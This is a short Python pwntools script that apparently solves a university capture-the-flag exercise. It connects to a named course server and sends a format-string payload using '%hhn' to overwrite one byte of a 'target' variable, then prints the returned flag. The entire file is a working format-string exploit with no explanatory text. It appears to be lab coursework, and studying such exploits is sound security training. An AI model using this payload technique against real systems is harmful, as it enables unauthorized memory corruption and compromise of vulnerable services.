from pwn import *

elf = ELF('05_write_specific_byte')
target_address = elf.symbols['target']

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
PORT = 25195

s = remote(SERVER, PORT, timeout=9999)

s.sendline(p32(target_address + 3) + b'.%253c%7$hhn')
flag = s.recv(512)
print(flag)
